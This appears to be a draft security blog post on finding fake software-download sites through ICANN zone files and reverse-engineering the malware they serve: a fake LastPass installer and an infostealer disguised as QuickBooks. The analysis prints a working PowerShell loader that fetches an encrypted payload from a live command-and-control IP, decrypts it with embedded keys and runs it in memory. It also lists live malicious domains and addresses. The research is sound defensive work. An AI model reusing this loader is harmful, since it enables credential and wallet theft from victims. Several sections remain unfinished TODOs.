---
title: How to find malware in the wild
date: "2023-03-26T23:19:48.121Z"
description: Using domain zone files that contain lists of all active domains, we can search for fake websites, passing as real websites for already existing products, that offer downloads to software that have malware attached. In this article, we'll look at a fake Quickbooks sites trying to spread malware.
tags: ["reverse-engineering", "malware"]
published: true
---

# How to find fraudulant sites

ICANN is the internet's governing body that controls all domain TLD's, from the public .com, .net, .org, etc. to private ones registered by companies, like .audi, .nike, etc. Creating an account with ICANN [here](https://account.icann.org/registeraccount) allows you to apply for access to a list of all active domains for specific TLD's (aka *zone files*). Once you've gone [here](https://czds.icann.org/zone-requests/all) to select the zone files you'd like to search, you'll go through an application process that asks your personal information and what you intend on doing with the data. Most TLD's will be approved within minutes to hours, some will take longer like 1-3 days. I applied for access to every TLD they offerered and over the course of two weeks, 99% of them had been approved.

If you don't want to go through ICANN, you can buy a one-month subscription to a site like [zonefiles.io](https://zonefiles.io). 

# Searching the zone files

Depending on where you get the zone files, they can be as large as 7GB+ gzipped. A trick I found to be able to search through these large zip files without extracting them is running a command like:

```shell
gunzip -c ALLZONES_zone_full.gz | grep "quickbooks" > quickbooks-domains.txt
```

Resulting in files like this:

`gist:joshterrill/38891d0eb2c1b15617e4a1abfc15b7a9#quickbooks-domains.txt`

Going through these domains, we see that there are three categories:

1. It's a domain that the actual company owns, and they just own it so no one else can have it. These likely will redirect back to the main company website.

2. It's a domain that is parked and goes nowhere, or doesn't resolve to anything.

3. It's a domain that looks identical to the real product site, but isn't owned by the company, and is being used to spread downloads of the product with malware in it.

We can write a simple javascript script that loops through these domains and finds the ones that likely fall into the third category that we're interested in.

`gist:joshterrill/38891d0eb2c1b15617e4a1abfc15b7a9#domain-verification.js`

Running this script through our list shrinks the results down significantly:

`gist:joshterrill/38891d0eb2c1b15617e4a1abfc15b7a9#quickbooks-domains-results.txt`

# Analyzing LastPass malware

Looking through our filtered list of LastPass domains, we find a domain called `https://lastpassword.org`. It has a valid certificate, similar to the actual https://lastpass.com website, but a few things become suspicious immediately.

1. The domain `https://lastpassword.org` doesn't redirect to https://lastpass.com, despite it looking very similar
2. The download link points to a different domain called `https://ozturk-web.com/`
3. The file that is downloaded has a generic name: `https://ozturk-web.com/captcha/appsetup_v14.3.zip`
4. When extracting the initial zip file, the executable installer is > 800MB when the real LastPass installer is ~95MB. This could be a sign that the malicious executable file is packed and/or obfuscated with junk code. Another reason why some might create such large executable files for malware is that sites like VirusTotal only allow uploads <= 650MB. But if we simply take the much smaller zip file and upload it to VirusTotal, we see several hits: https://www.virustotal.com/gui/file/3727544a95fe98f0ebbd0d8138bdae745af64e88cb18eebe7dd04ae0eba49005

![AppSetup zip file analyzed through Virus Total](./assets/virus-total-appset-exe.png)

# Stage 1 - The Powershell script

Using [Process Explorer](https://learn.microsoft.com/en-us/sysinternals/downloads/process-explorer) and [TCPView](https://learn.microsoft.com/en-us/sysinternals/downloads/tcpview) from SysInternals, we see that the malware spawns a `powershell.exe` process, and then calls out to a command and control server at `45.93.201.114`. This gives us a good place to starting point when we disassemble the executabele.

![Malware in process explorer](./assets/procexp.png)

![Malware in tcpview](./assets/tcpview.png)

Loading the executable as a Microsoft .NET Assembly in IDA Pro, we see 0 imports, 1 obfuscated export, a crazy looking function graph, and only a few readable strings that indicate that it probably has some anti-debugger capabilities, and it has been packed with [*Eziriz's ".NET Reactor"*](https://www.eziriz.com/).

![Malware IDA Graph](./assets/malware-graph.png)

![Malware IDA Strings](./assets/malware-strings.png)

I found an unpacking tool called [NETReactorSlayer](https://github.com/SychicBoy/NETReactorSlayer) which can be run by: `.\NETReactorSlayer.CLI.exe .\appsetup_v14.3.exe`, creating a new file called `appsetup_v14.3_Slayed.exe` that is only 222KB.

![NETReactorSlayer CLI](./assets/netreactor-slayer.png)

Now that we've unpacked the malware, we can load it into dnSpy (32-bit) and look through the modules what might be responsible for spawning `powershell.exe` - *likely* a `Process.Start()` call. If you're dealing with something else, a safe bet would be to put a breakpoint on any `.Invoke()` calls you find, then step through the code until you find what you're looking for. Worst case scenario, set dnSpy to break on *EntryPoint* and step through it from there. In this case, `Process.Start()` was found in the `GForm0` class here:

![Process Start](./assets/process-start.png)

After setting the breakpoint and running the executable, the breakpoint shows a variables called `fileName` with a value of: `C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` and a variable called `text` with a value of:

```powershell
$ephapseAbluent = [System.Text.Encoding]::UTF8.GetString([System.Convert]::Frombase64String('NDUuOTMuMjAxLjExNA=='));
$abluentFlywort = [System.Text.Encoding]::UTF8.GetString([System.Convert]::Frombase64String('L2RvY3MvT3BqSG1CT3JRU3lIV2Y4dHQwTUVncEVEa3M3UUNHLnR4dA=='));
$arctiidHatlike = new-object System.Net.Sockets.TcpClient
$arctiidHatlike.Connect($ephapseAbluent, 80)
$alumnusArctiid = $arctiidHatlike.GetStream();
$arctiidHatlike.SendTimeout = 300000;
$arctiidHatlike.ReceiveTimeout = 300000;
$abluentAlumnus = [System.Text.StringBuilder]::new()
$abluentAlumnus.AppendLine('GET ' + $abluentFlywort);
$abluentAlumnus.AppendLine('Host: ' + $ephapseAbluent);
$abluentAlumnus.AppendLine();
$ephapseAlumnus = [System.Text.Encoding]::ASCII.GetBytes($abluentAlumnus.ToString());
$alumnusArctiid.Write($ephapseAlumnus, 0, $ephapseAlumnus.Length);
$medishAbluent = New-Object System.IO.MemoryStream;
$alumnusArctiid.CopyTo($medishAbluent);
$alumnusArctiid.Dispose();
$arctiidHatlike.Dispose();
$medishAbluent.Position = 0;
$arctiidMiniate = $medishAbluent.ToArray();
$medishAbluent.Dispose();
$medishMiniate = [System.Text.Encoding]::ASCII.GetString($arctiidMiniate).IndexOf('`r`n`r`n')+1;
$hatlikeAlumnus = [System.Text.Encoding]::ASCII.GetString($arctiidMiniate[$medishMiniate..($arctiidMiniate.Length-1)]);
$hatlikeAlumnus = [System.Convert]::Frombase64String($hatlikeAlumnus);
$ephapseFlywort = New-Object System.Security.Cryptography.AesManaged;
$ephapseFlywort.Mode = [System.Security.Cryptography.CipherMode]::CBC;
$ephapseFlywort.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7;
$ephapseFlywort.Key = [System.Convert]::Frombase64String('aJvSOk5kMKPekqrDnZkBL1oUMR7885xdT/JCog+CMHQ=');
$ephapseFlywort.IV = [System.Convert]::Frombase64String('une0AqbEQmDMhGdzlX+yfg==');
$miniatePsi = $ephapseFlywort.CreateDecryptor();
$hatlikeAlumnus = $miniatePsi.TransformFinalBlock($hatlikeAlumnus, 0, $hatlikeAlumnus.Length);
$miniatePsi.Dispose();
$ephapseFlywort.Dispose();
$alumnusPsi = New-Object System.IO.MemoryStream(, $hatlikeAlumnus);
$arctiidFlywort = New-Object System.IO.MemoryStream;
$abluentMiniate = New-Object System.IO.Compression.GZipStream($alumnusPsi, [IO.Compression.CompressionMode]::Decompress);
$abluentMiniate.CopyTo($arctiidFlywort);
$hatlikeAlumnus = $arctiidFlywort.ToArray();
$miniateHatlike = [System.Reflection.Assembly]::Load($hatlikeAlumnus);
$hatlikeAbluent = [System.Text.Encoding]::UTF8.GetString([System.Convert]::Frombase64String('aGVlZGVyQ2hlbWlzZQ=='));
$alumnusHatlike = [System.Text.Encoding]::UTF8.GetString([System.Convert]::Frombase64String('cHNpQXJjdGlpZA=='));
$dunnageMiniate = [System.Text.Encoding]::UTF8.GetString([System.Convert]::Frombase64String('cHNpSGF0bGlrZQ=='));
$miniateAbluent = $miniateHatlike.GetType($hatlikeAbluent + '.' + $alumnusHatlike);
$dunnageMedish = $miniateAbluent.GetMethod($dunnageMiniate);
$dunnageMedish.Invoke($miniateMedish, (, [string[]] (''))); #($miniateMedish, $miniateMedish);\
```

If we do some manual decoding of the base64 strings, we see that the first couple of lines reference the C2 IP address we saw in TCPView: `45.93.201.114` and a path to a second stage payload at `/docs/OpjHmBOrQSyHWf8tt0MEgpEDks7QCG.txt`.

# Stage 2 - TODO:

-------------------------------------------------------

# Analyzing Quickbooks malware

Using the same methods of finding fake malicious sites, a few Quickbooks domains came up that were trying to pass themselves off as being legit, but were serving malicious `Quickbooks.exe` files. In this case, the one we'll be looking at is: `http://quickbooks-online.biz`. 

A quick look in Virus Total shows the following:

![virus total quickbooks](./assets/virus-total-quickbooks-exe.png)

Running the exe through Detect It Easy (DIE) shows that it is obfuscated by Eazfuscator. Using NetSlayer, we can deobfuscate it and open the resulting `Quickbooks_Slayed.exe` file in dnSpy. One thing to notice is the difference in filesize between the original and the unpacked versions.

![quickbooks filesize differences](./assets/filesize-difference.png)

# Stage 1 - Debugging `Quickbooks.exe`

TODO: get screenshots of the embedded "chess" game

After loading it in dnSpy, there are a few intersting image resources...

An image of a porn-star in resources called `DASAD` and `EFWGFFG`:

![interesting resource 1](./assets/interesting-resource-1.png)

What *looks like* compressed data, being represented as an image called `OrJX`:

![interesting resource 2](./assets/interesting-resource-2.png)

And another resource called `CityControl` that is 46,008 bytes. We can save these files for further analysis.

References to `CityControl` were found using the *Search Assemblies* tool (CTRL+SHIFT+K), and breakpoints were applied where the resource is referenced - now we can start the debugger.

Once the breakpoint is hit, we see code where a magic string of `"G2DH5H7R5ER47588857G754"` is used to decrypt the contents of the resource byte by byte, then it loads the result into memory through `Assembly.Load()`.

![CityControl decryption](./assets/city-control-decryption.png)

If we stop the debugger after the decryption has occurred but before `Assembly.Load(cityControl)` is called, we can right-click on the `cityControl` local variable and save it into a new file called  `CityControl-decrypted`. Loading this new file into DIE shows that it's a DLL file protected by Smart Assembly. Running this new binary through `NetSlayer`, then loading it into dnSpy shows that it's called `Tigra.dll`.

# Stage 2 - Reversing `Tigra.dll`

This DLL has a 18,057 byte resource called `{5412f298-bf84-4a62-92cd-0cda7baed9f5}` which appears to have some base64-encoded strings with several different kinds of separators that decode to:

  * HPV.Himentater
  * CausalitySource
  * SearchResult
  * Properties.Resource
  * Ver
  * Invalid file header
  * Unsupported file version
  * Unknown index type found
  * \<long base64 encoded string>

Looking through the classes, we find a reference to this resource in `Class3` that loads it into a stream. Starting the debugger on `Quickbooks.exe` again, this time stepping into the `.InvokeMember("CreateInstance")` method show in the screenshot above, brings us to a method inside `Tigra.dll` called `Dodge()` in the `Scraper.White` namespace.

![dodge debugged](./assets/dodge-debugged.png)

The reversed psuedo-code might look something like this:

```dotnet
/*
StringTypeInfo = "4F724A58"
InputBlockSize = "6B6A6E"
EscapedRemotingFormatter = "WindowsFormApplication1"
*/
public static void Dodge(string StringTypeInfo, string InputBlockSize, string EscapedRemotingFormatter)
{
    Thread.Sleep(37665) // sleep for 37 seconds
    string text = LoadResourceAndParseReversedTextAndDecode(); // "H4slAAAAAAAEAO29B2AcSZij9ynt......";
    byte[] decompressed = White.Gzip(base64Decode(text));
    Type type = Assembly.GetType(Assembly.Load(decompressed)); // {Name="Himentater", FullName="MPV.Himentater"}
    object obj = Activator.CreateInstance(type);
    StringTypeInfo = obj.CasualitySource(StringTypeInfo); // returns 'OrJX'
    InputBlockSize =  obj.CasualitySource(InputBlockSize); // returns 'kjn'
    Bitmap bmp = White.LowestBreakIteraction(StringTypeInfo, EscapedRemotingFormatter); // calls ResourceManager load on 'OrJX'
    byte[] array = ConvertBitmapToByteArray(bmp);
    array = obj.SearchResult(array, InputBlockSize); // converts the array to "Collins.dll"
    Assembly collins = Assembly.Load(array);
    collins.BuildNewPE(); // builds "Decrassifier.exe"
    Environment.Exit(0);
}
```

It loads the base64 encoded resource file called `{5412f295-bf84-4a62-92cd-0cda7baed9f5}`, does some algorithms to decode the data, and then sends it through `White.GZip()` to uncompress. The result is a PE file called `Inspector.dll`.

After `Inspector.dll` is loaded, the strange looking image file we found in `Quickbooks.exe` called `OrJX` is loaded into a Bitmap object and parsed into a byte array that when saved to a file, gives us a PE file called `Collins.dll`.

# Stage 3 `Inspector.dll` and `Collins.dll`

## `Inspector.dll`

Once `Inspector.dll` is loaded into memory, a constructor is fired off that parses a resource called `{22dc5f59-9286-486a-b038-04077d50a92d}` which has several base64 strings that decode to the following:

* directoryPath
* DirectoryPath is not relative.
* path
* FilePath is not relative.
* Failed to roll back.
* TransactionalIO

The last string, TransactionalIO is then combined with the victim's temp directory, possibly to create a file later on that is used to store transactional data.

The DLL then goes through some decryption methods that take the incoming `StringTypeInfo` and `InputBlockSize` variables and converts the original values of `"4F724A58"` and `"6B6A6E"` to `"OrJX"` and `"kjn"`. These values are then used to load the image resource called `OrJX` from the original `Quickbooks.exe`. It looks like this:

<div class="override-width" style="max-width: 350px; margin: auto;">
    <img src="./assets/orjx-resource.png" alt="OrJX resource from Quickbooks.exe" />
</div>

The image is converted to a bitmap object, and then run through an algorithm that extracts another PE called `Collins.dll`.

## `Collins.dll`

After `Collins.dll` is loaded into memory, a method at `cypDwx5HfbgULZ6J7r.eEyrTPH05UmRT25qTM.ltqp2KDBJj` is called which has a large switch/case statement with many branching passes and a lot of recursion. It appears the only thing that this DLL is responsible for is to load its embedded resources, parse them through a custom algorithm, and outputs another PE file called `Decrassify.exe`. The contents of this PE are loaded into a newly spawned process which has the same name as the original file: `Quickbooks.exe`.

# Stage 4: `Decrassify.exe`

This EXE file appears to be the final stage of this malware, and where all of the actual malicious functionality lives. Loading `Decrassify.exe` into dnSpy reveals that the purpose of this executable is to steal sensitive information off your computer via a meriad of different methods and techniques that we'll go into.

The first method that is called is `Program.WriteLine()` - we see a call to `Check()` which checks to see if the victim is located in any of these countries:

![whitelist countries](./assets/whitelist-countries.png)

If the victim resides in any of these countries, the malicious code will *not* execute.

Next we see some functionality that checks for the existence of several different properties from an `Arguments` class as shown here:

![Decrassify.exe arguments class](./assets/decrassify-arguments.png)

The `Program` class takes `Arguments.IP` and `Arguments.Key`, then runs them through a simple base64 + XOR decryption. The result of which is the C2 IP address and port: `91.107.159.152:33685`. An attempt is made to connect to this IP and port, but at the time of writing this article, they were not active. Nmap shows that the IP resolves, but the port is closed. This means the connection loop will continue to run every 5-seconds until a connection is made. We can break out of this loop by making the malware think it has made a connection by overwriting the following variables: `flag3=true` and `flag5=false`.

The last part of this stage takes `Arguments.ID`, decodes it using base64 + XOR, the resulting string equals `PartsSender()`. Finding this method in the disassembly reveals several methods for stealing website passwords, banking information, browsing history, discord tokens, telegram tokens, crypto wallets, information about the infected computer (disk space, total RAM, installed programs, etc.), VPN profiles for ProtonVPN and OpenVPN, and more. The results are then sent in a payload back to the C2 address.

# Conclusion

These are just a couple of examples of how you can find malware in the wild, and as you can imagine, there are hundreds of examples of these fraudulant sites that can be found by searching through zone files. Some other ideas for products to search might be: VMWare, TOR Browser, ImgBurn, ExpressVPN, Dropbox, etc. 






TODO: come up with good stage names for everything


TODO: get virus total link for quickbooks
